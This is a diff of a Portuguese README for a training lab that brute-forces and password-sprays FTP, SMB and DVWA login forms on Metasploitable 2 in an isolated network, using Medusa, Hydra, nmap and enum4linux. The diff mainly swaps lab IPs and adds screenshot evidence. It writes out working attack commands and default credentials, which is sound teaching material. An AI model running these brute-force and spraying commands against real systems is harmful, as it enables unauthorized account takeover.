@@ -1,4 +1,4 @@
-# 🔐 Laboratório de Ataques de Força Bruta com Kali Linux e Medusa
+**# 🔐 Laboratório de Ataques de Força Bruta com Kali Linux e Medusa
 
 > Projeto prático de segurança ofensiva simulando ataques de **força bruta** e **password spraying** contra ambientes deliberadamente vulneráveis (**Metasploitable 2** e **DVWA**), com foco em auditoria de credenciais e **medidas de mitigação**.
 >
@@ -97,7 +97,7 @@ Duas máquinas virtuais em **rede isolada (Host-Only / Rede Interna)** no Virtua
    ┌────────┴─────────┐                      ┌───────────────┴────────┐
    │   KALI LINUX     │                      │   METASPLOITABLE 2     │
    │   (Atacante)     │  ───  ataques  ───►  │   (Alvo vulnerável)    │
-   │ 192.168.56.101   │   FTP / HTTP / SMB   │   192.168.56.102       │
+   │ 192.168.56.102   │   FTP / HTTP / SMB   │   192.168.56.101       │
    │                  │                      │   + DVWA (web)         │
    │  Medusa, Nmap,   │                      │   FTP(21) HTTP(80)     │
    │  enum4linux      │                      │   SMB(139,445)         │
@@ -106,8 +106,8 @@ Duas máquinas virtuais em **rede isolada (Host-Only / Rede Interna)** no Virtua
 
 | Máquina | Papel | SO | IP (exemplo) |
 |---|---|---|---|
-| Kali Linux | Atacante | Kali Rolling | `192.168.56.101` |
-| Metasploitable 2 | Alvo | Ubuntu 8.04 (vulnerável) | `192.168.56.102` |
+| Kali Linux | Atacante | Kali Rolling | `192.168.56.102` |
+| Metasploitable 2 | Alvo | Ubuntu 8.04 (vulnerável) | `192.168.56.101` |
 
 > O **DVWA** já vem pré-instalado no Metasploitable 2 e também pode ser instalado isoladamente. Credencial padrão do DVWA: `admin / password`.
 
@@ -131,12 +131,26 @@ No VirtualBox, para **ambas** as VMs:
 No Kali:
 ```bash
 ip a                       # descobre o IP da interface do lab
-ping -c 3 192.168.56.102   # testa alcance ao alvo
+ping -c 3 192.168.56.101   # testa alcance ao alvo
 ```
 
 ### 4. Credenciais padrão do Metasploitable 2
 - Login do sistema: `msfadmin / msfadmin`
 - DVWA (web): `admin / password`
+
+### 📸 Evidências do ambiente
+
+| Metasploitable (VirtualBox) | Boot do Metasploitable |
+|---|---|
+| ![VM Metasploitable no VirtualBox](images/01-ambiente-metasploitable.png) | ![Tela de login do Metasploitable](images/02-metasploitable-login.png) |
+
+| IP do alvo (`ip a` → 192.168.56.101) | Kali Linux (VirtualBox) |
+|---|---|
+| ![IP do Metasploitable](images/03-metasploitable-ip.png) | ![VM Kali no VirtualBox](images/04-ambiente-kali.png) |
+
+**Teste de conectividade (Kali → alvo):**
+
+![Ping do Kali para o alvo](images/05-conectividade-ping.jpg)
 
 ---
 
@@ -145,7 +159,7 @@ ping -c 3 192.168.56.102   # testa alcance ao alvo
 Antes de atacar, identificamos **quais serviços estão expostos**.
 
 ```bash
-nmap -sV -sC -p 21,80,139,445 192.168.56.102
+nmap -sV -sC -p 21,80,139,445 192.168.56.101
 ```
 
 | Flag | Significado |
@@ -165,7 +179,9 @@ PORT     STATE  SERVICE     VERSION
 
 > Script pronto: [`scripts/00-recon-nmap.sh`](scripts/00-recon-nmap.sh)
 
-📸 *Sugestão de captura:* `images/01-nmap.png`
+**Evidência — serviços expostos no alvo:**
+
+![Nmap mostrando as portas 21, 80, 139 e 445 abertas](images/06-nmap-servicos.jpg)
 
 ---
 
@@ -174,7 +190,7 @@ PORT     STATE  SERVICE     VERSION
 **Objetivo:** descobrir credenciais válidas do serviço FTP (porta 21).
 
 ```bash
-medusa -h 192.168.56.102 \
+medusa -h 192.168.56.101 \
        -U wordlists/usuarios.txt \
        -P wordlists/senhas.txt \
        -M ftp \
@@ -185,8 +201,8 @@ medusa -h 192.168.56.102 \
 
 **Interpretando a saída:**
 ```
-ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: msfadmin Password: 123456 (Incorrect)
-ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT CHECK: [ftp] Host: 192.168.56.101 User: msfadmin Password: 123456 (Incorrect)
+ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
 ```
 
 - `ACCOUNT CHECK` → tentativa em andamento;
@@ -199,7 +215,11 @@ grep "ACCOUNT FOUND" resultado_ftp.log
 
 > Script pronto: [`scripts/01-brute-ftp.sh`](scripts/01-brute-ftp.sh)
 
-📸 *Sugestão de captura:* `images/02-ftp-success.png`
+**Evidência — criação das wordlists e Medusa encontrando a senha:**
+
+![Criação das listas de usuários e senhas](images/07-criacao-wordlists.jpg)
+
+![Medusa — ACCOUNT FOUND: msfadmin / msfadmin SUCCESS no FTP](images/08-brute-force-ftp.jpg)
 
 ---
 
@@ -208,13 +228,13 @@ grep "ACCOUNT FOUND" resultado_ftp.log
 **Objetivo:** automatizar tentativas de login no formulário da página *Brute Force* do DVWA.
 
 ### Preparação
-1. Acesse `http://192.168.56.102/dvwa/` e faça login (`admin / password`).
+1. Acesse `http://192.168.56.101/dvwa/` e faça login (`admin / password`).
 2. Em **DVWA Security**, defina o nível como **Low** (sem token CSRF — ideal para aprendizado).
 3. Capture o cookie **`PHPSESSID`** (DevTools → *Application* → *Cookies*).
 
 ### Ataque com Medusa (módulo `web-form`)
 ```bash
-medusa -h 192.168.56.102 \
+medusa -h 192.168.56.101 \
        -u admin \
        -P wordlists/senhas.txt \
        -M web-form \
@@ -229,13 +249,19 @@ A lógica é dizer ao Medusa **qual mensagem aparece quando a senha está errada
 ### Alternativa com Hydra
 No DVWA, o **Hydra** costuma ser mais previsível para formulários web:
 ```bash
-hydra -l admin -P wordlists/senhas.txt 192.168.56.102 http-get-form \
+hydra -l admin -P wordlists/senhas.txt 192.168.56.101 http-get-form \
 "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=SEU_PHPSESSID"
 ```
 
 > Script pronto: [`scripts/02-brute-dvwa.sh`](scripts/02-brute-dvwa.sh)
 
-📸 *Sugestão de captura:* `images/03-dvwa-form.png`
+**Evidência — tela do DVWA e Medusa automatizando o login web:**
+
+![Tela de login do DVWA](images/10-dvwa-login.png)
+
+![Medusa atacando o formulário de login do DVWA](images/11-ataque-web-dvwa-medusa.jpg)
+
+> ℹ️ Observação técnica: quando a mensagem de falha (`DENIED-MESSAGE` / `FAIL`) não casa exatamente com a resposta do alvo, o Medusa pode marcar **vários `[SUCCESS]` falsos** (todos os usuários "encontrados"). Ajustar a string de erro ao texto real da página elimina esses falsos positivos — um aprendizado importante sobre a precisão da detecção.
 
 ---
 
@@ -245,16 +271,16 @@ hydra -l admin -P wordlists/senhas.txt 192.168.56.102 http-get-form \
 
 ### Etapa 1 — Enumeração de usuários
 ```bash
-enum4linux -U 192.168.56.102
+enum4linux -U 192.168.56.101
 # ou a versão mais recente:
-enum4linux-ng -U 192.168.56.102
+enum4linux-ng -U 192.168.56.101
 ```
 Isso revela usuários locais, compartilhamentos e políticas de senha.
 
 ### Etapa 2 — Password spraying com Medusa (módulo `smbnt`)
 Testa **uma senha** contra **a lista inteira de usuários**:
 ```bash
-medusa -h 192.168.56.102 \
+medusa -h 192.168.56.101 \
        -U wordlists/usuarios.txt \
        -p "Outono2026!" \
        -M smbnt \
@@ -268,7 +294,7 @@ O script automatiza o laço "1 senha → todos os usuários" para cada senha do 
 
 > Script pronto: [`scripts/03-password-spray-smb.sh`](scripts/03-password-spray-smb.sh)
 
-📸 *Sugestão de captura:* `images/04-smb-enum.png`
+📸 *Cenário opcional — evidência não capturada neste lab. Para gerá-la, rode os comandos acima e salve o print do `enum4linux` + spray em `images/`.*
 
 ---
 
@@ -278,19 +304,21 @@ Encontrar a credencial é só metade do trabalho — é preciso **provar** que e
 
 **FTP:**
 ```bash
-ftp 192.168.56.102
+ftp 192.168.56.101
 # Name: msfadmin   Password: msfadmin
 # 230 Login successful.
 ```
 
 **SMB (listar compartilhamentos com a credencial descoberta):**
 ```bash
-smbclient -L //192.168.56.102 -U msfadmin
+smbclient -L //192.168.56.101 -U msfadmin
 ```
 
 **DVWA:** efetue o login manualmente no navegador com a senha encontrada e confirme o acesso à área autenticada.
 
-📸 *Sugestão de captura:* `images/05-validacao.png`
+**Evidência — login FTP real com a credencial descoberta:**
+
+![Login FTP bem-sucedido: 230 Login successful](images/09-validacao-ftp.jpg)
 
 ---
 
@@ -348,8 +376,8 @@ medusa-brute-force-lab/
 git clone https://github.com/SEU-USUARIO/medusa-brute-force-lab.git
 cd medusa-brute-force-lab/scripts
 chmod +x *.sh
-./00-recon-nmap.sh 192.168.56.102
-./01-brute-ftp.sh  192.168.56.102
+./00-recon-nmap.sh 192.168.56.101
+./01-brute-ftp.sh  192.168.56.101
 ```
 
 ---
@@ -383,3 +411,4 @@ chmod +x *.sh
 ⭐ Se este material foi útil, deixe uma estrela no repositório!
 
 </div>
+**
